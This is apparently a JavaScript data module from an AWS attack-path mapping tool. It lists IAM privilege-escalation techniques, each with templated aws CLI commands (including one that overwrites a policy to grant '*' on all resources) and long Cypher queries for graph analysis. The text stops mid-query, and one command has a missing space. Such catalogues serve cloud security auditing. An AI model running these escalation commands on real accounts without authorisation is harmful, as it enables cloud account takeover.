export default {
attacks : {
  "CreatePolicyVersion": {
    "Description": "Overwrites the default version of the specified managed policy.",
    "Options": [
      "Admin"
    ],
    "Commands": [
      "aws create-policy-version --policy-arn ${AWS::IAM::Policy}.Arn --set-as-default --policy-document file://<(cat <<EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Admin\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"*\",\n            \"Resource\": \"*\"\n        }]\n}\nEOF\n)"
    ],
    "Attack": {
      "Depends": "AWS::IAM::Policy",
      "Requires": [
        "iam:CreatePolicyVersion"
      ],
      "Affects": "AWS::IAM::Policy",
      "Cypher": [
        "(SIZE(SPLIT(${AWS::IAM::Policy}.PolicyVersionList,'IsDefaultVersion')) - 1) < 5"
      ]
    },
    "Grants": "Admin",
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::Policy`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::Policy`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:CreatePolicyVersion'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL  AND (SIZE(SPLIT(target.PolicyVersionList,'IsDefaultVersion')) - 1) < 5 WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreatePolicyVersion'}]-> (pattern:Pattern:CreatePolicyVersion{Name:'CreatePolicyVersion'}) ON CREATE SET  pattern.Requires = ['iam:CreatePolicyVersion'], pattern.Depends = \"AWS::IAM::Policy\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws create-policy-version --policy-arn ${AWS::IAM::Policy}.Arn --set-as-default --policy-document file://<(cat <<EOF\\n{\\n    \"Version\": \"2012-10-17\",\\n    \"Statement\": [\\n        {\\n            \"Sid\": \"Admin\",\\n            \"Effect\": \"Allow\",\\n            \"Action\": \"*\",\\n            \"Resource\": \"*\"\\n        }]\\n}\\nEOF\\n)']|REPLACE(_, \"${AWS::IAM::Policy}.Arn\", grant.Arn))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ADMIN{Name:'Admin'}]->(grant) ON CREATE SET  edge.Description = \"Overwrites the default version of the specified managed policy.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "AssociateInstanceProfile": {
    "Description": "Associates an IAM instance profile with a running or stopped instance.",
    "Commands": [
      "aws ec2 associate-iam-instance-profile --iam-instance-profile ${AWS::IAM::InstanceProfile} --instance-id ${AWS::EC2::Instance}"
    ],
    "Attack": {
      "Depends": "AWS::EC2::Instance",
      "Requires": [
        "ec2:AssociateIamInstanceProfile"
      ],
      "Affects": "AWS::EC2::Instance",
      "Grants": "AWS::IAM::InstanceProfile",
      "Cypher": [
        "(${AWS::IAM::InstanceProfile})-[{Name:'AssociatedWithRole'}]->(${AWS::IAM::Role})",
        "(${})-[:TRANSITIVE*..]->()-[{Name:'iam:PassRole'}]->(${AWS::IAM::Role})"
      ]
    },
    "Grants": "HasAttachedInstanceProfile",
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::EC2::Instance`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  MATCH (grants:`AWS::IAM::InstanceProfile`) OPTIONAL MATCH path=(source)-[:TRANSITIVE|ATTACK|CREATE*..]->(generic:Generic:`AWS::IAM::InstanceProfile`) WHERE grants = generic WITH source, options, admin, CASE WHEN (grants:Resource) OR ((grants:Generic) AND generic = grants) THEN grants END AS grants, path WHERE NOT grants IS NULL WITH source, options, admin, grants, REDUCE(commands=[], _ IN EXTRACT(_ IN FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern)|_.Commands)|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, options, admin,  COLLECT([grants, COALESCE(commands,[])]) AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::EC2::Instance`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['ec2:AssociateIamInstanceProfile'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL  WITH source, edge, options, target, path, grants UNWIND grants AS grant WITH source, edge, options, target, path, grant[0] AS grant, grant[1] AS grant_commands MATCH (grant)-[{Name:'AssociatedWithRole'}]->(awsiamrole:`AWS::IAM::Role`), (source)-[:TRANSITIVE*..]->()-[{Name:'iam:PassRole'}]->(awsiamrole:`AWS::IAM::Role`) WITH source, edge, options, target, path, COLLECT([grant,grant_commands]) AS grants WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, COLLECT([target, commands]) AS options, grants  MERGE (source)-[:ATTACK{Name:'AssociateInstanceProfile'}]-> (pattern:Pattern:AssociateInstanceProfile{Name:'AssociateInstanceProfile'}) ON CREATE SET  pattern.Requires = ['ec2:AssociateIamInstanceProfile'], pattern.Depends = \"AWS::EC2::Instance\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws ec2 associate-iam-instance-profile --iam-instance-profile ${AWS::IAM::InstanceProfile} --instance-id ${AWS::EC2::Instance}']|REPLACE(REPLACE(_, \"${AWS::IAM::InstanceProfile}\", grant.Name), \"${AWS::EC2::Instance}\", option.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'HasAttachedInstanceProfile'}]->(grant) ON CREATE SET  edge.Description = \"Associates an IAM instance profile with a running or stopped instance.\", edge.Commands = commands, edge.Weight = SIZE(commands) WITH pattern, options UNWIND options AS option WITH pattern, option[0] AS option, option[1] AS commands MERGE (pattern)-[edge:OPTION{Name:'Option'}]->(option) ON CREATE SET edge.Weight = SIZE(commands), edge.Commands = commands "
  },
  "AssumeRole": {
    "Description": "Returns a set of temporary security credentials (consisting of an access key ID, a secret access key, and a security token) that you can use to access AWS resources that you might not normally have access to.",
    "Commands": [
      "aws sts assume-role --role-arn ${AWS::IAM::Role}.Arn --role-session-name AssumeRole"
    ],
    "Attack": {
      "Requires": [
        "sts:AssumeRole"
      ],
      "Affects": "AWS::IAM::Role",
      "Cypher": [
        "(${})-[:TRUSTS{Name:'IsTrustedBy'}]->(${AWS::IAM::Role})"
      ]
    },
    "Grants": "AssumeRole",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'sts:AssumeRole', Effect: 'Allow'}]->(target:`AWS::IAM::Role`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL  AND (source)-[:TRUSTS{Name:'IsTrustedBy'}]->(target) WITH source, target, [] AS commands, options, grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'AssumeRole'}]-> (pattern:Pattern:AssumeRole{Name:'AssumeRole'}) ON CREATE SET  pattern.Requires = ['sts:AssumeRole'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws sts assume-role --role-arn ${AWS::IAM::Role}.Arn --role-session-name AssumeRole']|REPLACE(_, \"${AWS::IAM::Role}.Arn\", grant.Arn))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'AssumeRole'}]->(grant) ON CREATE SET  edge.Description = \"Returns a set of temporary security credentials (consisting of an access key ID, a secret access key, and a security token) that you can use to access AWS resources that you might not normally have access to.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "AddRoleToInstanceProfile": {
    "Description": "Adds the specified IAM role to the specified instance profile.",
    "Commands": [
      "aws iam add-role-to-instance-profile--instance-profile-name ${AWS::IAM::InstanceProfile} --role-name ${AWS::IAM::Role}"
    ],
    "Attack": {
      "Depends": "AWS::IAM::InstanceProfile",
      "Requires": [
        "iam:AddRoleToInstanceProfile"
      ],
      "Affects": "AWS::IAM::InstanceProfile",
      "Grants": "AWS::IAM::Role"
    },
    "Grants": "AssociatedWithRole",
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::InstanceProfile`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  MATCH (grants:`AWS::IAM::Role`) OPTIONAL MATCH path=(source)-[:TRANSITIVE|ATTACK|CREATE*..]->(generic:Generic:`AWS::IAM::Role`) WHERE grants = generic WITH source, options, admin, CASE WHEN (grants:Resource) OR ((grants:Generic) AND generic = grants) THEN grants END AS grants, path WHERE NOT grants IS NULL WITH source, options, admin, grants, REDUCE(commands=[], _ IN EXTRACT(_ IN FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern)|_.Commands)|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, options, admin,  COLLECT([grants, COALESCE(commands,[])]) AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::InstanceProfile`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:AddRoleToInstanceProfile'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands UNWIND options AS option WITH source, target, grants, option[0] AS option,REDUCE(commands=[], _ IN commands + option[1]|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, target, commands, grants, [[NULL, []]] AS options WHERE target = option  WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, COLLECT([target, commands]) AS options, grants  MERGE (source)-[:ATTACK{Name:'AddRoleToInstanceProfile'}]-> (pattern:Pattern:AddRoleToInstanceProfile{Name:'AddRoleToInstanceProfile'}) ON CREATE SET  pattern.Requires = ['iam:AddRoleToInstanceProfile'], pattern.Depends = \"AWS::IAM::InstanceProfile\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam add-role-to-instance-profile--instance-profile-name ${AWS::IAM::InstanceProfile} --role-name ${AWS::IAM::Role}']|REPLACE(REPLACE(_, \"${AWS::IAM::InstanceProfile}\", option.Name), \"${AWS::IAM::Role}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'AssociatedWithRole'}]->(grant) ON CREATE SET  edge.Description = \"Adds the specified IAM role to the specified instance profile.\", edge.Commands = commands, edge.Weight = SIZE(commands) WITH pattern, options UNWIND options AS option WITH pattern, option[0] AS option, option[1] AS commands MERGE (pattern)-[edge:OPTION{Name:'Option'}]->(option) ON CREATE SET edge.Weight = SIZE(commands), edge.Commands = commands "
  },
  "AddUserToGroup": {
    "Description": "Adds the specified user to the specified group.",
    "Commands": [
      "aws iam add-user-to-group --user-name ${AWS::IAM::User} --group-name ${AWS::IAM::Group}"
    ],
    "Attack": {
      "Depends": "AWS::IAM::User",
      "Requires": [
        "iam:AddUserToGroup"
      ],
      "Affects": "AWS::IAM::Group"
    },
    "Grants": "IsMemberOfGroup",
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::User`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::Group`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:AddUserToGroup'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 1 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'AddUserToGroup'}]-> (pattern:Pattern:AddUserToGroup{Name:'AddUserToGroup'}) ON CREATE SET  pattern.Requires = ['iam:AddUserToGroup'], pattern.Depends = \"AWS::IAM::User\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam add-user-to-group --user-name ${AWS::IAM::User} --group-name ${AWS::IAM::Group}']|REPLACE(REPLACE(_, \"${AWS::IAM::Group}\", grant.Name), \"${AWS::IAM::User}\", option.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'IsMemberOfGroup'}]->(grant) ON CREATE SET  edge.Description = \"Adds the specified user to the specified group.\", edge.Commands = commands, edge.Weight = SIZE(commands) WITH pattern, options UNWIND options AS option WITH pattern, option[0] AS option, option[1] AS commands MERGE (pattern)-[edge:OPTION{Name:'Option'}]->(option) ON CREATE SET edge.Weight = SIZE(commands), edge.Commands = commands "
  },
  "AttachGroupPolicy": {
    "Description": "Attaches the specified managed policy to the specified IAM group.",
    "Commands": [
      "aws iam attach-group-policy --group-name ${AWS::IAM::Group} --policy-arn ${AWS::IAM::Policy}.Arn"
    ],
    "Attack": {
      "Depends": "AWS::IAM::Group",
      "Requires": [
        "iam:AttachGroupPolicy"
      ],
      "Affects": "AWS::IAM::Group",
      "Grants": "AWS::IAM::Policy"
    },
    "Grants": "HasAttachedManagedPolicy",
    "CYPHER": "MATCH path=(source:Resource)-[:TRANSITIVE|ATTACK|CREATE*0..]->(option:`AWS::IAM::Group`) WHERE option:Resource OR option:Generic WITH source, option, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies WITH COLLECT([source, option, REDUCE(commands=[], _ IN dependencies|CASE WHEN _ IN commands THEN commands ELSE commands + _.Commands END)]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS option, MIN(SIZE(result[2])) AS weight UNWIND results AS result WITH result, source, option, weight, result[2] AS commands WHERE source = result[0] AND option = result[1] AND weight = SIZE(result[2]) WITH source, option, commands, weight ORDER BY weight WITH source, COLLECT([option, commands]) AS options OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH source,  options,  REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  MATCH (grants:`AWS::IAM::Policy`) OPTIONAL MATCH path=(source)-[:TRANSITIVE|ATTACK|CREATE*..]->(generic:Generic:`AWS::IAM::Policy`) WHERE grants = generic WITH source, options, admin, CASE WHEN (grants:Resource) OR ((grants:Generic) AND generic = grants) THEN grants END AS grants, path WHERE NOT grants IS NULL WITH source, options, admin, grants, REDUCE(commands=[], _ IN EXTRACT(_ IN FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern)|_.Commands)|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands WITH source, options, admin,  COLLECT([grants, COALESCE(commands,[])]) AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::Group`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:AttachGroupPolicy'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, 